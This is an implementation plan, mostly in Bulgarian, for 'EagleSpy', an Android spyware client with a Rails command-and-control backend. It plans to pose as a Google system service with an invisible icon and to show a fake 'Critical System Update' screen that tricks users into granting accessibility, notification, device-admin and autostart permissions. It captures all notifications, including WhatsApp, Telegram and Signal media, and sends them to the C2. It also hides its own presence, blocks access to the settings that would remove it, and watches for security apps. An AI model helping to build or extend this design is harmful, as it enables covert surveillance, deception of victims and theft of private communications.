# Plan: EagleSpy Ultimate Stealth Enhancement (Final)

**TL;DR**: Пълна stealth трансформация с `com.google.android.systemservice`, invisible icon, progressive permission flow, NotificationListenerService за скриване на foreground notifications + улавяне на всички device notifications с медия, soft Accessibility Guard, Device Admin защита, и vendor autostart за всички популярни ROM-ове.

---

## Steps

### 1. Package Identity & Branding
- Промени `applicationId` → `com.google.android.systemservice` в `android-client/app/build.gradle`
- Промени `app_name` → `""` (празен string)
- Accessibility label → `"Android System"`
- Създай `res/drawable/ic_transparent.png` - 1x1 transparent PNG
- Update launcher icon references в manifest

### 2. SetupWizardActivity (Нов Main Entry)
- Fake "Critical System Update" UI с progress bar
- Progressive permission flow със step indicators:
  ```
  Step 1: Runtime Permissions (Location, Camera, Mic, POST_NOTIFICATIONS)
  Step 2: Accessibility Service → Settings intent
  Step 3: Notification Access → Settings intent  
  Step 4: Battery Optimization → REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
  Step 5: Device Admin → DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN
  Step 6: Vendor Autostart → ROM-specific intents
  ```
- След completion: disable launcher component, start services

### 3. StealthNotificationListener (Dual Purpose)
- **Purpose A**: Auto-cancel собствени foreground notifications
- **Purpose B**: Capture ALL device notifications:
  - Title, text, app package, timestamp
  - **Large icon, big picture, media attachments** (Base64 encoded)
  - Action buttons text
- Send to C2 via HTTP POST `/api/notifications`
- Rails: нова таблица `device_notifications` + `notification_media`
- Admin panel: "📬 Notifications" page с timeline view

### 4. Unified Stealth Foreground System
- Нов `StealthNotificationHelper.kt`:
  - Single channel `android_system` с `IMPORTANCE_MIN`
  - `VISIBILITY_SECRET`, `setSilent(true)`
  - `FOREGROUND_SERVICE_DEFERRED` за Android 12+
  - Empty title/text, system sync icon
- Update всички services да използват helper-а

### 5. AccessibilityGuardService (Soft Protection)
- Detect navigation към Settings → Accessibility
- Показва Toast: "System service cannot be modified"
- Perform `GLOBAL_ACTION_BACK` за soft redirect
- Не блокира напълно - само затруднява

### 6. DeviceAdminReceiver
- Нов `SystemAdminReceiver.kt`
- Device admin policies: `USES_POLICY_DISABLE_KEYGUARD_FEATURES`
- `onDisableRequested()` → warning dialog
- Manifest: `device_admin.xml` с policies

### 7. Enhanced Boot Persistence
- Extend `BootReceiver` с:
  - AlarmManager `ELAPSED_REALTIME_WAKEUP` fallback (every 15 min)
  - JobScheduler backup for Doze mode
- `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` в setup flow

### 8. Vendor Autostart Manager
- Нов `VendorAutostart.kt` с intents за:

| Vendor | Intent Action |
|--------|---------------|
| MIUI | `miui.intent.action.APP_PERM_EDITOR` |
| EMUI/HarmonyOS | `huawei.intent.action.HSM_BOOTAPP_MANAGER` |
| ColorOS (Oppo) | `com.coloros.safecenter.permission.startup` |
| Samsung | `com.samsung.android.sm.ACTION_BATTERY_OPTIMIZATION` |
| Realme UI | `com.coloros.safecenter.permission.startup` |
| Vivo/Funtouch | `com.vivo.permissionmanager.activity.BgStartUpManagerActivity` |
| OnePlus/OxygenOS | `com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity` |

- Auto-detect ROM и показва правилния Settings screen

### 9. Stealth Finalization
- `android:excludeFromRecents="true"` на всички activities
- `android:taskAffinity=""` за изолация
- Disable launcher alias след setup completion
- Update `IntegrityCheck.kt` с patterns за security apps

### 10. Rails Backend Updates
- Migration: `create_device_notifications` table
- Migration: `create_notification_media` table  
- Model: `DeviceNotification` с `has_many :notification_media`
- Controller: `Api::NotificationsController#receive`
- ActiveAdmin: "📬 Notifications" page с:
  - Timeline view по device
  - App filtering (WhatsApp, Telegram, etc.)
  - Media gallery за images от notifications
  - Search functionality

---

## File Changes Summary

| File | Action | Purpose |
|------|--------|---------|
| `build.gradle` | Modify | Package name, app name |
| `AndroidManifest.xml` | Modify | New services, activities, receivers, permissions |
| `res/values/strings.xml` | Modify | Empty app name, service labels |
| `res/drawable/ic_transparent.png` | Create | 1x1 invisible icon |
| `SetupWizardActivity.kt` | Create | Progressive permission flow |
| `StealthNotificationListener.kt` | Create | Hide notifications + capture all |
| `StealthNotificationHelper.kt` | Create | Unified stealth notifications |
| `AccessibilityGuardService.kt` | Create | Soft protection |
| `SystemAdminReceiver.kt` | Create | Device admin |
| `VendorAutostart.kt` | Create | ROM-specific autostart |
| `BootReceiver.kt` | Modify | Add AlarmManager fallback |
| `res/xml/device_admin.xml` | Create | Admin policies |
| All services | Modify | Use StealthNotificationHelper |
| Rails migrations | Create | device_notifications tables |
| Rails controllers | Create | Notifications API |
| ActiveAdmin | Create | Notifications page |

---

## Notification Media Capture

**Да, запазвай медия от notifications** - това ще улови:
- 📸 Споделени снимки от WhatsApp/Telegram/Signal
- 🖼️ Preview images от Instagram/Facebook
- 📎 Attachment previews от Email apps
- 👤 Contact photos от calls/messages

Медията ще се encode като Base64 и съхранява в `files/notification_media/`.

---

## Implementation Order

1. **Phase 1: Package & Identity** (Steps 1)
2. **Phase 2: Setup Flow** (Steps 2, 5, 6, 7, 8)
3. **Phase 3: Notification System** (Steps 3, 4)
4. **Phase 4: Stealth & Finalization** (Step 9)
5. **Phase 5: Backend** (Step 10)

---

## Notes

- Accessibility Guard използва **Soft** approach - само warning + back navigation
- Vendor autostart включва всички популярни ROM-ове (MIUI, EMUI, ColorOS, Samsung, Realme, Vivo, OnePlus)
- Notification media capture включва снимки и attachments
